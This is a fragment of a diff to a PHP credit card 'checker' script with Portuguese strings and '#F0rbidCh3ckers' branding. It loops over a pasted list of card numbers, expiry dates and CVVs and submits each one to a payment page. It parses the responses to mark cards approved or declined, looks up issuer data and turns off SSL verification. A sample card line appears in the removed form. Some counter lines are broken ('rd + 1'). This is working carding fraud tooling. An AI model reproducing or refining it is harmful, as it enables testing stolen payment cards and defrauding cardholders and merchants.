+curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$result2 = curl_exec($ch);
+curl_close($ch);
 
-    ?>
-    <form method="POST" action="">
-          <fieldset>
-              <legend>LISTA:</legend>
-                <form action="" method=post name=f>
-     
-            <p align="center">
-            <textarea id="cclist" name="cclist" class="tab-pane fade active in" class="textarea" style="width: 978px; height: 210px">4551821022189157|04|2017|305| AVISO O FORMATO E ESSE AI NAO COLOQUE OUTRO QUE NAO TESTA!</textarea><br>Remover Duplicadas<input name=dup type=checkbox value=1 checked><br>
-                                           <input class="submit-button" type="submit" name="submit" value="CHECK">
-     
-            </p>
-     
-            </form>
-    </fieldset>
-            <?php }?>
+$data = json_decode($result2);
+Aprovadas("<center>คpяσvคdค  ✓ ".$line[$i]." [ $data->brand - $data->issuer $data->type $data->country_code ] #F0rbidCh3ckers </center>");
+ $ap = $ap + 1;
+ ap($ap);}
+elseif(strpos($result, "Recusado.")){ Reprovadas("<center><font color=#A52A2A>rєρrσvα∂α ".$line[$i]."</center>");
+ $rp = $rp + 1;
+ rp($rp);}
+elseif(strpos($result, "O seu pagamento foi submetido para processamento.")){ Reprovadas("<center><font color=#A52A2A>rєρrσvα∂α ".$line[$i]."</center>");
+ $rp = $rp + 1;
+ rp($rp);}
+elseif(strpos($result, "Introduzir um número de cartão válido.")){ Reprovadas("<center><font color=#A52A2A>rєρrσvα∂α ".$line[$i]."</center>");
+ $rp = $rd + 1;
+ rp($rp);}
+elseif(strpos($result, "A data de expiração deve ser uma data no futuro.")){ Reprovadas("<center><font color=#A52A2A>rєρrσvα∂α ".$line[$i]."</center>");
+ $rp = rd + 1;
+ rp($rp);}
+elseif(strpos($result, "Página de pagamento seguro")){ Reprovadas("<center><font color=#A52A2A>rєρrσvα∂α ".$line[$i]."</center>");
+ $rp = rd + 1;
+ rp($rp);}
+elseif(strpos($result, "Your transaction is not yet complete. Please press continue.")){ Reprovadas("<center><font color=#A52A2A>rєρrσvα∂α ".$line[$i]."</center>");
+ $rp = $rp + 1;
+ rp($rp);}
+elseif(strpos($result, "Número de cartão inválido. Por favor tente novamente.")){ Reprovadas("<center><font color=#A52A2A>rєρrσvα∂α ".$line[$i]."</center>");
+ $rp = $rp + 1;
+ rp($rp);}
+else{Echo "<center><font color=yellow>".$line[$i]." -> Nova Resposta Para Adicionar! </font></center>";}
+$fila--; 
+fila($fila);
+ob_flush();flush();
+$result;
+}
+ if(empty($fila)){fila($fila = 0);}
+ if(empty($ap)){ap($ap = 0);}
+ if(empty($rp)){rp($rp = 0);}
+ Echo "<br><br><center><font color='white' style='text-shadow: 0px 1px 2px white'; >Teste Finalizado!</font></center>";
+
+}
+?>
